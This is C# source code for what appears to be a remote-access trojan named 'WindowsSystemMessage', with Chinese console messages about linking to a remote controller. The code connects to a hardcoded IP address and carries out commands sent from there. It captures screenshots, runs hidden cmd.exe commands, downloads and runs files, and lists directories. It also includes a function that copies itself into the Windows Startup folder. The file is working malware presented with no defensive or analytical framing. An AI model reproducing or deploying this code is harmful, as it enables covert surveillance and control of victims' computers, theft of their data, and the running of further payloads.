using System;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Drawing;
using System.IO.Compression;
using System.Drawing.Imaging;
using System.Windows.Forms;

namespace WindowsSystemMessage
{
    class Program
    {
        static void Main(string[] args)
        {
            System.Net.ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            Console.WriteLine("正在尝试与远控端建立连接....");
            TcpClient tcpClient = new TcpClient();
            tcpClient.Connect("", 25565);//远控端主机的IP地址
            tcpClient.Connect("", 25565);//远控端主机的IP公网地址
            Console.WriteLine("已与远控端建立连接!");

            Stream stm = tcpClient.GetStream();
            ASCIIEncoding asen = new ASCIIEncoding();
            WebClient web = new WebClient();

            string path = System.Environment.CurrentDirectory;
            DirectoryInfo root = new DirectoryInfo(path);
            string file_name = "";
            //systemrun(path);
            foreach (FileInfo file in root.GetFiles())
            {
                file_name += file.Name + " ";
            }
            while (tcpClient.Connected)
            {
                try
                {
                    byte[] remessage = asen.GetBytes("Can not find this command!");
                    byte[] bb = new byte[200];
                    int k = stm.Read(bb, 0, 200);
                    string Server_message = "";
                    for (int i = 0; i < k; i++)
                    {
                        Server_message += Convert.ToChar(bb[i]);
                    }
                    switch (Server_message)
                    {
                        case "help":
                            remessage = asen.GetBytes("All Command\nmonitor put: Obtain the screenshot of the current screen of the controlled machine" +
                                "\nwho am i: Get host name" +
                                "\nwhere am i: Get this exe path" +
                                "\ndownload [type] [url]: Download file" +
                                "\nrun [filename]: run application" +
                                "\nunzip [filename]: unzip zipfile" +
                                "\ncmd [command]: cmd command");
                            break;
                        case "monitor put":
                            Bitmap Jpeg = photo();
                            MemoryStream mStream = new MemoryStream();
                            byte[] photo_byte;
                            Jpeg.Save(mStream, ImageFormat.Jpeg);
                            photo_byte = mStream.ToArray();
                            remessage = photo_byte;
                            break;
                        case "where am i":
                            remessage = asen.GetBytes(System.Environment.CurrentDirectory);
                            break;
                        case "who am i":
                            string username = Environment.UserName;
                            remessage = asen.GetBytes(username);
                            break;
                        case "ls":
                            path = System.Environment.CurrentDirectory;
                            root = new DirectoryInfo(path);
                            file_name = "";
                            foreach (FileInfo file in root.GetFiles())
                            {
                                file_name += file.Name + " ";
                            }
                            remessage = asen.GetBytes(file_name);
                            break;
                        default:
                            break;
                    }
                    if (Server_message.Contains("cmd"))
                    {
                        string cmd_command = Server_message.Replace("cmd ", "");
                        Process process = new Process();
                        process.StartInfo.FileName = "cmd.exe";
                        process.StartInfo.Arguments = "/c" + cmd_command;
                        process.StartInfo.UseShellExecute = false;
                        process.StartInfo.CreateNoWindow = true;
                        process.StartInfo.RedirectStandardError = true;
                        process.StartInfo.RedirectStandardInput = true;
                        process.StartInfo.RedirectStandardOutput = true;
                        process.Start();
                        string cmd_output = process.StandardOutput.ReadToEnd();
                        string cmd_erroutput = process.StandardError.ReadToEnd();
                        process.WaitForExit();
                        process.Close();
                        remessage = asen.GetBytes("CMD: " + cmd_output + "\n" + "Error:" + cmd_erroutput);
                    }
                    if (Server_message.Contains("download"))
                    {
                        string filetype = Server_message.Remove(12).Replace("download", "").Replace(" ", "");
                        string url = Server_message.Replace("download", "").Replace(" " + filetype + " ", "");
                        Random rd = new Random();
                        int rdn = rd.Next(0, 10000000);
                        web.DownloadFile(url, rdn.ToString() + "." + filetype);
                        remessage = asen.GetBytes("Download Complete!");
                    }
                    if (Server_message.Contains("run"))
                    {
                        string path_ = System.Environment.CurrentDirectory;
                        string filename = Server_message.Replace("run ", "");
                        Process runexe = new Process();
                        runexe.StartInfo.FileName = path_ + @"\" + filename;
                        runexe.Start();
                        remessage = asen.GetBytes("Run Complete!");
                    }
                    if (Server_message.Contains("unzip"))
                    {
                        string path_ = System.Environment.CurrentDirectory;
                        string filename = Server_message.Replace("unzip ", "");
                        ZipFile.ExtractToDirectory(path_ + @"\" + filename, path_);
                        remessage = asen.GetBytes("Unzip Conmplete!");
                    }
                    stm.Write(remessage, 0, remessage.Length);
                }
                catch (IOException)
                {
                    tcpClient.Close();
                    tcpClient = new TcpClient();
                    while (!tcpClient.Connected)
                    {
                        Console.WriteLine("已与远控端断开连接!正在尝试重新连接....");
                        tcpClient.Connect("182.105.189.43", 25565);
                        Console.WriteLine("已与远控端建立连接!");
                        stm = tcpClient.GetStream();
                    }
                }
            }
            Console.ReadKey();
        }
        /// <summary>
        /// photo函数用于截取当前显示器图像
        /// </summary>
        static public Bitmap photo()
        {
            var JpegScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                           Screen.PrimaryScreen.Bounds.Height,
                                           PixelFormat.Format32bppArgb);
            var gfxScreenshot = Graphics.FromImage(JpegScreenshot);
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                        Screen.PrimaryScreen.Bounds.Y,
                                        0,
                                        0,
                                        Screen.PrimaryScreen.Bounds.Size,
                                        CopyPixelOperation.SourceCopy);
            return JpegScreenshot;
        }
        static public void systemrun(string sourcepath)
        {
            string myself = sourcepath + @"\WindowsSystemMessage.exe";
            string username = Environment.UserName;
            string targetPath = @"C:\Users\" + username + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";
            FileInfo file = new FileInfo(myself);
            if (file.Exists)
            {
                file.CopyTo(targetPath + @"\WindowsSystemMessage.exe", true);
            }
        }
    }
}